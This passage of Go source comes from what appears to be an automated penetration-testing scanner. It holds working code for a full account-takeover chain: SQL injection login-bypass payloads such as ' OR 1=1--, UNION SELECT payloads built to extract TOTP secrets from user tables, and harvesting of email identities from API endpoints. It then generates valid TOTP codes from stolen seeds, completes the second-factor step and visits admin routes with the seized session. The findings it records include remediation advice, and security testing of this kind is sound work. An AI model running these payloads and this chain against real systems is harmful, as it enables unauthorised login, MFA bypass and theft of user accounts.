			email:          email,
			password:       password,
			label:          label,
			targetIdentity: strings.TrimSpace(targetIdentity),
		})
	}
	for _, identity := range identities {
		identity = strings.TrimSpace(identity)
		if identity == "" {
			continue
		}
		labelBase := loginSQLiIdentityLabel(identity)
		add(identity+`' --`, "anything", labelBase+"-email-quote-dashdash", identity)
		add(identity+`'--`, "anything", labelBase+"-email-quote-tight-dashdash", identity)
		add(identity, `' OR '1'='1' --`, labelBase+"-password-or-tautology", identity)
	}
	add(`' OR 1=1--`, "anything", "email-or-tautology", "")
	add(`' OR '1'='1' --`, "anything", "email-or-tautology-quoted", "")
	return payloads
}

func loginSQLiIdentityLabel(identity string) string {
	identity = strings.ToLower(strings.TrimSpace(identity))
	if at := strings.Index(identity, "@"); at > 0 {
		identity = identity[:at]
	}
	if identity == "" {
		return "identity"
	}
	var b strings.Builder
	for _, r := range identity {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') {
			b.WriteRune(r)
			continue
		}
		if b.Len() > 0 && !strings.HasSuffix(b.String(), "-") {
			b.WriteByte('-')
		}
	}
	out := strings.Trim(b.String(), "-")
	if out == "" {
		return "identity"
	}
	return out
}

func loginSQLiCredentialFields(entry types.TrafficEntry) (string, string) {
	identityField := "email"
	passwordField := "password"
	identityCandidates := []string{"email", "username", "user", "login", "identifier", "userid", "user_id", "phone", "mobile"}
	passwordCandidates := []string{"password", "pass", "passwd", "pwd", "secret", "credential"}
	updateFromKey := func(key string) {
		key = strings.TrimSpace(key)
		if key == "" {
			return
		}
		norm := normalizeJSONKey(key)
		for _, candidate := range identityCandidates {
			if norm == normalizeJSONKey(candidate) {
				identityField = key
				return
			}
		}
		for _, candidate := range passwordCandidates {
			if norm == normalizeJSONKey(candidate) {
				passwordField = key
				return
			}
		}
	}

	body := strings.TrimSpace(string(entry.Request.Body))
	if body == "" {
		return identityField, passwordField
	}
	var obj map[string]any
	if json.Unmarshal([]byte(body), &obj) == nil {
		for key := range obj {
			updateFromKey(key)
		}
		return identityField, passwordField
	}
	if values, err := url.ParseQuery(body); err == nil && len(values) > 0 {
		for key := range values {
			updateFromKey(key)
		}
	}
	return identityField, passwordField
}

func (v *VerifierAgent) loginSQLiIdentityCandidates(ctx context.Context, entry types.TrafficEntry, max int) []string {
	if max <= 0 {
		return nil
	}
	seen := make(map[string]bool)
	var out []string
	add := func(identity string) {
		if len(out) >= max {
			return
		}
		identity = strings.TrimSpace(identity)
		if identity == "" || !strings.Contains(identity, "@") {
			return
		}
		key := strings.ToLower(identity)
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, identity)
	}
	addEmailsFromBody := func(body []byte) {
		if len(out) >= max || len(body) == 0 {
			return
		}
		for _, hit := range observedEmailLikeRegex.FindAllString(string(body), max) {
			add(hit)
			if len(out) >= max {
				return
			}
		}
	}

	origin := originFromURL(entry.Request.URL)
	if origin == "" {
		origin = v.resolveTargetBase()
	}
	origin = strings.TrimRight(origin, "/")
	if origin == "" {
		return out
	}
	for _, path := range loginSQLiIdentityEndpointPaths() {
		if ctx.Err() != nil || len(out) >= max {
			return out
		}
		rawURL := origin + path
		resp, body, _, err := v.proactiveGET(ctx, rawURL)
		if err == nil && resp != nil && resp.StatusCode >= 200 && resp.StatusCode < 300 &&
			strings.Contains(strings.ToLower(body), "@") {
			addEmailsFromBody([]byte(body))
			continue
		}
		if authResp, authBody, _, _, err := v.proactiveGETWithObservedAuth(ctx, rawURL); err == nil &&
			authResp != nil && authResp.StatusCode >= 200 && authResp.StatusCode < 300 &&
			strings.Contains(strings.ToLower(authBody), "@") {
			addEmailsFromBody([]byte(authBody))
		}
	}

	addEmailsFromBody(entry.Request.Body)
	addEmailsFromBody(entry.Response.Body)

	if entries, err := v.db.GetTrafficByScan(v.scanID); err == nil {
		for _, highValueOnly := range []bool{true, false} {
			for _, observed := range entries {
				if highValueOnly && !loginSQLiHighValueIdentityTraffic(observed) {
					continue
				}
				addEmailsFromBody(observed.Request.Body)
				addEmailsFromBody(observed.Response.Body)
				if len(out) >= max {
					return out
				}
			}
		}
	}
	return out
}

func loginSQLiIdentityEndpointPaths() []string {
	return []string{
		"/api/users",
		"/api/Users",
		"/api/accounts",
		"/api/Accounts",
		"/api/customers",
		"/users",
		"/accounts",
		"/rest/users",
		"/rest/user",
		"/rest/user/authentication-details",
		"/rest/user/authentication-details/",
	}
}

func loginSQLiHighValueIdentityTraffic(entry types.TrafficEntry) bool {
	text := strings.ToLower(entry.Request.URL + " " + entry.Request.Path + " " + entry.Response.ContentType)
	if strings.Contains(text, "user") || strings.Contains(text, "account") ||
		strings.Contains(text, "customer") || strings.Contains(text, "profile") ||
		strings.Contains(text, "identity") || strings.Contains(text, "auth") {
		return true
	}
	body := entry.Response.Body
	if len(body) > 4096 {
		body = body[:4096]
	}
	lowerBody := strings.ToLower(string(body))
	return strings.Contains(lowerBody, `"email"`) || strings.Contains(lowerBody, `"username"`) ||
		strings.Contains(lowerBody, `"users"`) || strings.Contains(lowerBody, `"accounts"`)
}

func (v *VerifierAgent) loginSQLiIdentityCandidatesFromAuthenticatedEndpoints(ctx context.Context, loginURL, token string, max int) []string {
	token = strings.TrimSpace(token)
	if token == "" || max <= 0 {
		return nil
	}
	origin := strings.TrimRight(originFromURL(loginURL), "/")
	if origin == "" {
		origin = strings.TrimRight(v.resolveTargetBase(), "/")
	}
	if origin == "" {
		return nil
	}
	headers := map[string]string{
		"Authorization": "Bearer " + token,
		"Cookie":        "token=" + token,
	}
	seen := make(map[string]bool)
	var out []string
	add := func(identity string) {
		if len(out) >= max {
			return
		}
		identity = strings.TrimSpace(identity)
		if identity == "" || !strings.Contains(identity, "@") {
			return
		}
		key := strings.ToLower(identity)
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, identity)
	}
	for _, path := range loginSQLiIdentityEndpointPaths() {
		if ctx.Err() != nil || len(out) >= max {
			return out
		}
		resp, body, _, err := v.proactiveGETWithHeaders(ctx, origin+path, headers, "AOBTD/Verifier (post-login-bypass identity harvest)")
		if err != nil || resp == nil || resp.StatusCode < 200 || resp.StatusCode >= 300 || !strings.Contains(strings.ToLower(body), "@") {
			continue
		}
		for _, hit := range observedEmailLikeRegex.FindAllString(body, max) {
			add(hit)
			if len(out) >= max {
				return out
			}
		}
	}
	return out
}

type mfaSecretCandidate struct {
	Identity      string
	Secret        string
	SourceURL     string
	SourceParam   string
	SourcePayload string
	BodyPreview   string
}

type mfaChallengeToken struct {
	Token        string
	LoginURL     string
	LoginPath    string
	LoginPayload string
	Status       int
	BodyPreview  string
}

type mfaVerifyResult struct {
	VerifyURL   string
	VerifyPath  string
	Body        string
	BodyPreview string
	CodeSkew    int
}

// probeMFASecretLoginChain turns separate recon facts into the account-takeover
// story a human tester would try: can we harvest an MFA seed, obtain a
// second-factor challenge token for that identity, generate a TOTP, and finish
// the login flow? The implementation is intentionally bounded and generic:
// candidates come from observed JSON and limited UNION probes on already
// search/list-looking SQLi targets; no application-specific usernames are
// embedded here.
func (v *VerifierAgent) probeMFASecretLoginChain(ctx context.Context, target string) {
	origin := strings.TrimRight(originFromURL(target), "/")
	if origin == "" {
		origin = strings.TrimRight(target, "/")
	}
	if origin == "" {
		return
	}
	candidates := v.mfaSecretCandidates(ctx, origin)
	if len(candidates) == 0 {
		return
	}
	v.db.InsertNarration(v.scanID, "verifier", "observed",
		fmt.Sprintf("Found %d identity+MFA-secret candidate(s); attempting a bounded second-factor takeover chain.", len(candidates)),
		origin, map[string]any{"candidate_count": len(candidates)})

	for _, candidate := range candidates {
		if ctx.Err() != nil {
			return
		}
		challenge, ok := v.obtainMFAChallengeToken(ctx, origin, candidate.Identity)
		if !ok {
			continue
		}
		result, ok := v.verifyMFAChallengeWithSecret(ctx, origin, challenge.Token, candidate.Secret)
		if !ok {
			continue
		}
		token := extractAuthTokenFromJSON([]byte(result.Body))
		if token != "" {
			v.learnedAuthHeaders = map[string]string{"Authorization": "Bearer " + token}
			v.promoteBrowserSessionFromAuthResponse(ctx, challenge.LoginURL, []byte(result.Body), candidate.Identity,
				"MFA secret chain verification")
		}
		v.confirmed++
		v.storeMFASecretLoginChainFinding(candidate, challenge, result)
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("MFA chain confirmed for %s: harvested seed material, obtained a second-factor token, generated TOTP, and completed login.",
				candidate.Identity),
			result.VerifyURL, map[string]any{
				"identity":    candidate.Identity,
				"login_path":  challenge.LoginPath,
				"verify_path": result.VerifyPath,
				"source_url":  candidate.SourceURL,
			})
		return
	}
}

func (v *VerifierAgent) mfaSecretCandidates(ctx context.Context, origin string) []mfaSecretCandidate {
	seen := make(map[string]bool)
	var out []mfaSecretCandidate
	add := func(c mfaSecretCandidate) {
		c.Identity = strings.TrimSpace(c.Identity)
		c.Secret = normalizeBase32Secret(c.Secret)
		if c.Identity == "" || c.Secret == "" || !strings.Contains(c.Identity, "@") {
			return
		}
		key := strings.ToLower(c.Identity) + "\x00" + c.Secret
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, c)
	}

	if entries, err := v.db.GetTrafficByScan(v.scanID); err == nil {
		for _, entry := range entries {
			if ctx.Err() != nil {
				return out
			}
			if entry.Response.StatusCode < 200 || entry.Response.StatusCode >= 300 || len(entry.Response.Body) == 0 {
				continue
			}
			source := entry.Request.URL
			for _, c := range mfaSecretCandidatesFromBody(string(entry.Response.Body), source, "", "") {
				add(c)
			}
		}
	}

	for _, c := range v.mfaSecretCandidatesViaUnionSQLi(ctx, origin, 8) {
		add(c)
		if len(out) >= 8 {
			return out
		}
	}
	return out
}

func (v *VerifierAgent) mfaSecretCandidatesViaUnionSQLi(ctx context.Context, origin string, limit int) []mfaSecretCandidate {
	if limit <= 0 {
		return nil
	}
	targets := v.querySQLiProbeTargets(ctx, origin)
	if len(targets) == 0 {
		return nil
	}
	seen := make(map[string]bool)
	var out []mfaSecretCandidate
	attempts := 0
	const maxAttempts = 96
	for _, target := range targets {
		if ctx.Err() != nil || len(out) >= limit || attempts >= maxAttempts {
			return out
		}
		if !querySQLiTargetLooksRelevant(target.Path, target.Param) {
			continue
		}
		for _, payload := range unionMFASecretPayloads() {
			if ctx.Err() != nil || len(out) >= limit || attempts >= maxAttempts {
				return out
			}
			attempts++
			resp, body, err := v.sendGETWithParam(ctx, target.URL, target.Param, payload, nil)
			v.tested++
			if err != nil || resp == nil || resp.StatusCode < 200 || resp.StatusCode >= 300 {
				if err == nil {
					v.dismissed++
				}
				continue
			}
			candidates := mfaSecretCandidatesFromBody(body, target.URL, target.Param, payload)
			if len(candidates) == 0 {
				v.dismissed++
				continue
			}
			for _, c := range candidates {
				c.SourceURL = target.URL
				c.SourceParam = target.Param
				c.SourcePayload = payload
				c.BodyPreview = truncateString(body, 500)
				c.Secret = normalizeBase32Secret(c.Secret)
				key := strings.ToLower(c.Identity) + "\x00" + c.Secret
				if c.Identity == "" || c.Secret == "" || seen[key] {
					continue
				}
				seen[key] = true
				out = append(out, c)
				if len(out) >= limit {
					break
				}
			}
			if len(candidates) > 0 {
				v.db.InsertNarration(v.scanID, "verifier", "observed",
					fmt.Sprintf("UNION probe on %s leaked %d identity+MFA-secret candidate(s).",
						target.Path, len(candidates)),
					target.URL, map[string]any{"param": target.Param})
			}
		}
	}
	return out
}

func unionMFASecretPayloads() []string {
	tables := []string{"Users", "users", "Accounts", "accounts"}
	identityCols := []string{"email", "username"}
	secretCols := []string{"totpSecret", "mfaSecret", "otpSecret", "secret"}
	prefixes := []string{`'))`, `')`, `'`, `")`, `"`}
	colCounts := []int{9, 8, 7, 10, 6, 11, 12, 5}
	var out []string
	seen := make(map[string]bool)
	for _, table := range tables {
		for _, identity := range identityCols {
			for _, secret := range secretCols {
				for _, cols := range colCounts {
					selectList := unionSelectListForMFA(identity, secret, cols)
					for _, prefix := range prefixes {
						payload := fmt.Sprintf("%s UNION SELECT %s FROM %s--", prefix, selectList, table)
						if seen[payload] {
							continue
						}
						seen[payload] = true
						out = append(out, payload)
						if len(out) >= 96 {
							return out
						}
					}
				}
			}
		}
	}
	return out
}

func unionSelectListForMFA(identityCol, secretCol string, count int) string {
	if count < 3 {
		count = 3
	}
	cols := make([]string, count)
	cols[0] = "id"
	cols[1] = identityCol
	cols[2] = fmt.Sprintf("COALESCE(%s,'')", secretCol)
	for i := 3; i < count; i++ {
		switch i {
		case 3, 4:
			cols[i] = "0"
		default:
			cols[i] = "'aobtd'"
		}
	}
	return strings.Join(cols, ",")
}

func mfaSecretCandidatesFromBody(body, sourceURL, sourceParam, payload string) []mfaSecretCandidate {
	body = strings.TrimSpace(body)
	if body == "" {
		return nil
	}
	var decoded any
	if err := json.Unmarshal([]byte(body), &decoded); err == nil {
		var out []mfaSecretCandidate
		collectMFASecretCandidatesFromJSON(decoded, sourceURL, sourceParam, payload, &out)
		return dedupeMFASecretCandidates(out)
	}
	return mfaSecretCandidatesFromText(body, sourceURL, sourceParam, payload)
}

func collectMFASecretCandidatesFromJSON(v any, sourceURL, sourceParam, payload string, out *[]mfaSecretCandidate) {
	switch typed := v.(type) {
	case map[string]any:
		var emails []string
		var secrets []string
		for key, value := range typed {
			keyLower := strings.ToLower(strings.TrimSpace(key))
			if s, ok := value.(string); ok {
				if observedEmailLikeRegex.MatchString(s) {
					emails = append(emails, observedEmailLikeRegex.FindAllString(s, -1)...)
				}
				if looksLikeMFASecretField(keyLower) {
					if secret := normalizeBase32Secret(s); secret != "" {
						secrets = append(secrets, secret)
					}
				}
				if strings.Contains(keyLower, "description") || strings.Contains(keyLower, "secret") {
					if secret := normalizeBase32Secret(s); secret != "" {
						secrets = append(secrets, secret)
					}
				}
			}
		}
		// Enrollment/setup endpoints often return a freshly generated seed
		// before the user has actually enabled MFA. That is sensitive and is
		// reported by the API-exposure probe, but it is not a login TOTP seed
		// and will not satisfy a second-factor challenge. Do not let these
		// setup-only objects crowd out real account seeds harvested elsewhere.
		if !mfaEnrollmentSetupObject(typed) {
			for _, email := range emails {
				for _, secret := range secrets {
					*out = append(*out, mfaSecretCandidate{
						Identity:      email,
						Secret:        secret,
						SourceURL:     sourceURL,
						SourceParam:   sourceParam,
						SourcePayload: payload,
					})
				}
			}
		}
		for _, value := range typed {
			collectMFASecretCandidatesFromJSON(value, sourceURL, sourceParam, payload, out)
		}
	case []any:
		for _, item := range typed {
			collectMFASecretCandidatesFromJSON(item, sourceURL, sourceParam, payload, out)
		}
	}
}

func mfaEnrollmentSetupObject(obj map[string]any) bool {
	var hasSetupToken, hasSecret, setupFalse bool
	for key, value := range obj {
		keyLower := strings.ToLower(strings.TrimSpace(key))
		switch keyLower {
		case "setuptoken", "setup_token", "mfasetuptoken", "totpsetuptoken":
			if strings.TrimSpace(fmt.Sprint(value)) != "" {
				hasSetupToken = true
			}
		case "secret", "totpsecret", "mfasecret", "otpsecret":
			if normalizeBase32Secret(fmt.Sprint(value)) != "" {
				hasSecret = true
			}
		case "setup", "isenabled", "enabled":
			if b, ok := value.(bool); ok && !b {
				setupFalse = true
			}
		}
	}
	return hasSetupToken && hasSecret && setupFalse
}

func mfaSecretCandidatesFromText(body, sourceURL, sourceParam, payload string) []mfaSecretCandidate {
	emails := observedEmailLikeRegex.FindAllString(body, -1)
	if len(emails) == 0 {
		return nil
	}
	secretRe := regexp.MustCompile(`\b[A-Z2-7]{16,64}\b`)
	secrets := secretRe.FindAllString(strings.ToUpper(body), -1)
	if len(secrets) == 0 {
		return nil
	}
	var out []mfaSecretCandidate
	for _, email := range emails {
		emailIdx := strings.Index(body, email)
		for _, secret := range secrets {
			secret = normalizeBase32Secret(secret)
			if secret == "" {
				continue
			}
			secretIdx := strings.Index(strings.ToUpper(body), secret)
			if emailIdx >= 0 && secretIdx >= 0 && absInt(emailIdx-secretIdx) > 1500 {
				continue
			}
			out = append(out, mfaSecretCandidate{
				Identity:      email,
				Secret:        secret,
				SourceURL:     sourceURL,
				SourceParam:   sourceParam,
				SourcePayload: payload,
			})
		}
	}
	return dedupeMFASecretCandidates(out)
}

func dedupeMFASecretCandidates(in []mfaSecretCandidate) []mfaSecretCandidate {
	seen := make(map[string]bool)
	var out []mfaSecretCandidate
	for _, c := range in {
		c.Identity = strings.TrimSpace(c.Identity)
		c.Secret = normalizeBase32Secret(c.Secret)
		if c.Identity == "" || c.Secret == "" || !strings.Contains(c.Identity, "@") {
			continue
		}
		key := strings.ToLower(c.Identity) + "\x00" + c.Secret
		if seen[key] {
			continue
		}
		seen[key] = true
		out = append(out, c)
	}
	return out
}

func looksLikeMFASecretField(key string) bool {
	key = strings.ToLower(strings.TrimSpace(key))
	return strings.Contains(key, "totp") ||
		strings.Contains(key, "mfa") ||
		strings.Contains(key, "otp") ||
		(strings.Contains(key, "secret") && !strings.Contains(key, "client"))
}

func normalizeBase32Secret(raw string) string {
	s := strings.ToUpper(strings.TrimSpace(raw))
	s = strings.Trim(s, `"' ,;:`+"\n\r\t")
	s = strings.ReplaceAll(s, " ", "")
	s = strings.TrimRight(s, "=")
	if len(s) < 16 || len(s) > 128 {
		return ""
	}
	for _, r := range s {
		if (r >= 'A' && r <= 'Z') || (r >= '2' && r <= '7') {
			continue
		}
		return ""
	}
	padded := s + strings.Repeat("=", (8-len(s)%8)%8)
	if _, err := base32.StdEncoding.WithPadding('=').DecodeString(padded); err != nil {
		return ""
	}
	return s
}

func (v *VerifierAgent) obtainMFAChallengeToken(ctx context.Context, origin, identity string) (mfaChallengeToken, bool) {
	loginPaths := []string{"/rest/user/login", "/api/auth/login", "/api/login", "/login", "/signin"}
	payloads := loginSQLiPayloadsForIdentities([]string{identity})
	for _, path := range loginPaths {
		if ctx.Err() != nil {
			return mfaChallengeToken{}, false
		}
		loginURL := origin + path
		if !v.endpointExists(ctx, loginURL, "POST") {
			continue
		}
		for _, payload := range payloads {
			body, status, _ := v.sendLoginAttempt(ctx, loginURL, "email", "password", payload.email, payload.password, nil)
			v.tested++
			tmpToken := extractMFAChallengeToken([]byte(body))
			if tmpToken == "" {
				if status > 0 {
					v.dismissed++
				}
				continue
			}
			return mfaChallengeToken{
				Token:        tmpToken,
				LoginURL:     loginURL,
				LoginPath:    path,
				LoginPayload: payload.email,
				Status:       status,
				BodyPreview:  truncateString(body, 500),
			}, true
		}
	}
	return mfaChallengeToken{}, false
}

func extractMFAChallengeToken(body []byte) string {
	var decoded any
	if err := json.Unmarshal(body, &decoded); err != nil {
		return ""
	}
	return findStringField(decoded, map[string]bool{
		"tmptoken":        true,
		"tmp_token":       true,
		"mfatoken":        true,
		"mfa_token":       true,
		"challenge_token": true,
		"challengetoken":  true,
		"secondfactor":    true,
	})
}

func (v *VerifierAgent) verifyMFAChallengeWithSecret(ctx context.Context, origin, tmpToken, secret string) (mfaVerifyResult, bool) {
	verifyPaths := []string{
		"/rest/2fa/verify",
		"/api/2fa/verify",
		"/api/mfa/verify",
		"/api/auth/2fa/verify",
		"/api/auth/mfa/verify",
		"/2fa/verify",
		"/mfa/verify",
	}
	now := time.Now()
	for _, path := range verifyPaths {
		if ctx.Err() != nil {
			return mfaVerifyResult{}, false
		}
		verifyURL := origin + path
		if !v.endpointExists(ctx, verifyURL, "POST") {
			continue
		}
		for _, skew := range []int{-30, 0, 30} {
			code, ok := generateTOTPCode(secret, now.Add(time.Duration(skew)*time.Second))
			if !ok {
				return mfaVerifyResult{}, false
			}
			for _, body := range mfaVerifyBodies(tmpToken, code) {
				bodyBytes, _ := json.Marshal(body)
				status, respBody, sent := v.sendJSONWithHeaders(ctx, "POST", verifyURL, bodyBytes, nil,
					"AOBTD/Verifier (MFA chain proof)")
				v.tested++
				if !sent || status < 200 || status >= 300 {
					if sent {
						v.dismissed++
					}
					continue
				}
				lower := strings.ToLower(respBody)
				if !strings.Contains(lower, "token") &&
					!strings.Contains(lower, "authentication") &&
					!strings.Contains(lower, "session") &&
					!strings.Contains(lower, "\"id\"") {
					v.dismissed++
					continue
				}
				return mfaVerifyResult{
					VerifyURL:   verifyURL,
					VerifyPath:  path,
					Body:        respBody,
					BodyPreview: truncateString(respBody, 500),
					CodeSkew:    skew,
				}, true
			}
		}
	}
	return mfaVerifyResult{}, false
}

func mfaVerifyBodies(tmpToken, code string) []map[string]any {
	return []map[string]any{
		{"tmpToken": tmpToken, "totpToken": code},
		{"tmp_token": tmpToken, "totp_token": code},
		{"token": tmpToken, "code": code},
		{"challengeToken": tmpToken, "otp": code},
		{"mfaToken": tmpToken, "mfaCode": code},
	}
}

func generateTOTPCode(secret string, at time.Time) (string, bool) {
	secret = normalizeBase32Secret(secret)
	if secret == "" {
		return "", false
	}
	padded := secret + strings.Repeat("=", (8-len(secret)%8)%8)
	key, err := base32.StdEncoding.WithPadding('=').DecodeString(padded)
	if err != nil {
		return "", false
	}
	counter := uint64(at.Unix() / 30)
	var msg [8]byte
	binary.BigEndian.PutUint64(msg[:], counter)
	mac := hmac.New(sha1.New, key)
	_, _ = mac.Write(msg[:])
	sum := mac.Sum(nil)
	if len(sum) < 20 {
		return "", false
	}
	offset := sum[len(sum)-1] & 0x0f
	if int(offset)+4 > len(sum) {
		return "", false
	}
	code := (binary.BigEndian.Uint32(sum[offset:offset+4]) & 0x7fffffff) % 1000000
	return fmt.Sprintf("%06d", code), true
}

func (v *VerifierAgent) storeMFASecretLoginChainFinding(candidate mfaSecretCandidate, challenge mfaChallengeToken, result mfaVerifyResult) {
	profile := types.PageProfile{ID: "POST " + result.VerifyPath, URL: result.VerifyURL, Method: "POST"}
	secretPreview := redactSecret(candidate.Secret)
	pocReq := fmt.Sprintf("POST %s HTTP/1.1\nHost: <target>\nContent-Type: application/json\n\n{\"tmpToken\":\"<tmp-token-from-login>\",\"totpToken\":\"<generated-from-%s>\"}",
		result.VerifyPath, secretPreview)
	steps := fmt.Sprintf(
		"1. Harvest identity + MFA seed material from %s%s.\n"+
			"2. Obtain a second-factor challenge by submitting a targeted login payload for `%s` to %s.\n"+
			"3. Generate a current TOTP from the harvested seed %s.\n"+
			"4. POST the challenge token and generated TOTP to %s.\n"+
			"5. Observe the server returns an authenticated session response.",
		candidate.SourceURL, mfaSourceParamSuffix(candidate.SourceParam), candidate.Identity,
		challenge.LoginPath, secretPreview, result.VerifyPath)
	impact := "MFA no longer protects the account: an attacker who can combine the credential/auth-bypass path with exposed TOTP seed material can complete the second factor and obtain a real session. " +
		"This is account takeover, not just sensitive-field disclosure."
	remediation := "Never expose MFA/TOTP seed material in API responses, SQL-queryable client paths, logs, or backups. Parameterize login/search queries to prevent SQLi-assisted seed harvesting, rotate exposed seeds, and require re-enrollment for affected users."
	v.storeFinding(profile, types.Finding{
		Title:            fmt.Sprintf("Exposed MFA seed enables 2FA login takeover for %s", candidate.Identity),
		Description:      fmt.Sprintf("AOBTD chained exposed MFA seed material with a login challenge flow: it harvested a TOTP seed for %s, obtained a second-factor challenge token from %s, generated a valid TOTP, and completed %s with an authenticated response.", candidate.Identity, challenge.LoginPath, result.VerifyPath),
		Severity:         types.SeverityCritical,
		Confidence:       types.ConfidenceConfirmed,
		EndpointID:       "POST " + result.VerifyPath,
		VulnType:         "mfa_secret_takeover",
		ParamName:        "totpToken",
		Payload:          "(generated TOTP from exposed seed)",
		PocRequest:       pocReq,
		PocResponse:      fmt.Sprintf("HTTP/1.1 200 OK\n\n%s", result.BodyPreview),
		StepsToReproduce: steps,
		Impact:           impact,
		Remediation:      remediation,
		Evidence: fmt.Sprintf("Identity: %s\nSeed: %s\nSeed source: %s\nLogin path: %s\nLogin payload: %s\nVerify path: %s\nVerify response preview: %s",
			candidate.Identity, secretPreview, candidate.SourceURL, challenge.LoginPath,
			truncateString(challenge.LoginPayload, 120), result.VerifyPath, result.BodyPreview),
	})
}

func mfaSourceParamSuffix(param string) string {
	param = strings.TrimSpace(param)
	if param == "" {
		return ""
	}
	return " via parameter `" + param + "`"
}

func redactSecret(secret string) string {
	secret = strings.TrimSpace(secret)
	if len(secret) <= 8 {
		return "<redacted>"
	}
	return secret[:4] + "…" + secret[len(secret)-4:]
}

func absInt(n int) int {
	if n < 0 {
		return -n
	}
	return n
}

func (v *VerifierAgent) promoteBrowserSessionFromAuthResponse(ctx context.Context, loginURL string, body []byte, username, source string) {
	if len(body) == 0 {
		return
	}
	token := extractAuthTokenFromJSON(body)
	if token == "" {
		return
	}
	v.learnedAuthHeaders = map[string]string{"Authorization": "Bearer " + token}
	if v.browser == nil || v.browser.Browser() == nil {
		return
	}
	storage := authStorageValuesFromLoginResponse(body, username, token)
	if len(storage) == 0 {
		return
	}
	if err := v.browser.SeedLocalStorage(ctx, v.target, storage); err != nil {
		v.logger.Debug("browser auth promotion failed", "source", source, "login_url", loginURL, "error", err)
		return
	}
	v.db.InsertNarration(v.scanID, "verifier", "auth_promotion",
		fmt.Sprintf("%s returned a token; seeded the controlled browser session and revisiting privileged client-side routes.", source),
		loginURL, map[string]any{"storage_keys": sortedMapKeys(storage)})

	for _, candidate := range v.privilegedUIRouteCandidates(6) {
		if ctx.Err() != nil {
			return
		}
		page, err := v.browser.Navigate(ctx, candidate)
		if err != nil {
			v.logger.Debug("privileged route revisit failed", "url", candidate, "error", err)
			continue
		}
		time.Sleep(1200 * time.Millisecond)
		_ = page.Close()
		v.db.LogAI(v.scanID, "verifier", "auth_promoted_route_visit",
			"Visited privileged JS-discovered route after token-yielding auth bypass",
			loginURL, candidate, source)
		_ = v.db.InsertDiscovery(v.scanID, store.Discovery{
			TargetURL: candidate,
			SourceURL: "auth_promoted_browser_session",
			Kind:      store.DiscoveryNavigator,
			Detail:    "browser visit after token-yielding auth bypass",
		})
	}
}

func (v *VerifierAgent) privilegedUIRouteCandidates(limit int) []string {
	if limit <= 0 {
		limit = 6
	}
	hashMode := observedHashRoutingForScan(v.db, v.scanID)
	rows, err := v.db.Conn().Query(`
		SELECT DISTINCT target_url
		FROM url_discoveries
		WHERE scan_id = ? AND kind = ? AND detail LIKE '%kind=ui%'
		ORDER BY id ASC
		LIMIT 100`, v.scanID, store.DiscoveryJSRoute)
	if err != nil {
		return nil
	}
	defer rows.Close()

	seen := make(map[string]struct{})
	var out []string
	for rows.Next() {
		var raw string
		if err := rows.Scan(&raw); err != nil {
			continue
		}
		candidate := normalizeJSUIRouteForBrowser(raw, v.target, hashMode)
		if candidate == "" || unsafeSPAUIRoute(candidate) || !privilegedSPAUIRoute(candidate) {
			continue
		}
		if _, ok := seen[candidate]; ok {
			continue
		}
		seen[candidate] = struct{}{}
		out = append(out, candidate)
		if len(out) >= limit {
			break
		}
	}
	base := strings.TrimRight(v.target, "/")
	if base != "" {
		for _, path := range []string{
			"/#/admin",
			"/#/administration",
			"/#/dashboard",
			"/#/console",
			"/#/manage",
			"/#/users",
			"/#/settings",
			"/admin",
			"/administration",
			"/dashboard",
			"/console",
			"/manage",
			"/users",
			"/settings",
		} {
			if len(out) >= limit {
				break
			}
			candidate := base + path
			if _, ok := seen[candidate]; ok {
				continue
			}
			if unsafeSPAUIRoute(candidate) || !privilegedSPAUIRoute(candidate) {
				continue
			}
			seen[candidate] = struct{}{}
			out = append(out, candidate)
		}
	}
	return out
}

func privilegedSPAUIRoute(raw string) bool {
	u, err := url.Parse(raw)
	if err != nil {
		return false
	}
	text := strings.ToLower(u.Path + "/" + u.Fragment)
	for _, marker := range []string{
		"admin", "administration", "manage", "moderator", "console",
		"dashboard", "accounting", "security", "settings", "users",
		"roles", "permissions",
	} {
		if strings.Contains(text, marker) {
			return true
		}
	}
	return false
}

var responseBearerTokenRE = regexp.MustCompile(`(?i)\bbearer\s+([A-Za-z0-9._~+/=-]{8,})`)

func loginAuthSuccessSignal(resp *http.Response, body []byte) string {
	if resp == nil {
		return ""
	}
	if token := strings.TrimSpace(extractAuthTokenFromJSON(body)); len(token) >= 8 {
		return "JSON token field"
	}
	if token := bearerTokenFromResponseHeader(resp.Header.Get("Authorization")); token != "" {
		return "Authorization bearer header"
	}
	if token := bearerTokenFromResponseBody(body); token != "" {
		return "Bearer token in response body"
	}
	for _, raw := range resp.Header.Values("Set-Cookie") {
		name, value, ok := parseSetCookieNameValue(raw)
		if !ok || !isLikelyVerifierSessionCookie(name) || len(strings.TrimSpace(value)) < 6 {
			continue
		}
		return "Set-Cookie " + name
	}
	return ""
}

func bearerTokenFromResponseHeader(raw string) string {
	parts := strings.Fields(strings.TrimSpace(raw))
	if len(parts) == 2 && strings.EqualFold(parts[0], "Bearer") && len(parts[1]) >= 8 {
		return parts[1]
	}
	return ""
}

func bearerTokenFromResponseBody(body []byte) string {
	match := responseBearerTokenRE.FindSubmatch(body)
	if len(match) != 2 {
		return ""
	}
	token := strings.TrimSpace(string(match[1]))
	if len(token) < 8 {
		return ""
	}
	return token
}

func isLikelyVerifierSessionCookie(name string) bool {
	lower := strings.ToLower(strings.TrimSpace(name))
	if lower == "" || strings.Contains(lower, "csrf") || strings.Contains(lower, "xsrf") {
		return false
	}
	return isLikelyAuthCookie(lower)
}

// sendLoginAttempt sends a POST with a JSON credential body and returns the
// response body, status code, and concrete auth-success signal if one exists.
func (v *VerifierAgent) sendLoginAttempt(ctx context.Context, rawURL, identityField, passwordField, identity, password string, extraHeaders map[string]string) (string, int, string) {
	identityField = strings.TrimSpace(identityField)
	passwordField = strings.TrimSpace(passwordField)
	if identityField == "" {
		identityField = "email"
	}
	if passwordField == "" {
		passwordField = "password"
	}
	payload := mustJSON(map[string]any{identityField: identity, passwordField: password})
	req, err := http.NewRequestWithContext(ctx, "POST", rawURL, strings.NewReader(payload))
	if err != nil {
		return "", 0, ""
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "AOBTD/Verifier (a pentest tool)")
	// Preserve any auth headers the scan captured — login endpoints sometimes
	// want a CSRF token or origin header.
	for k, vv := range extraHeaders {
		lower := strings.ToLower(k)
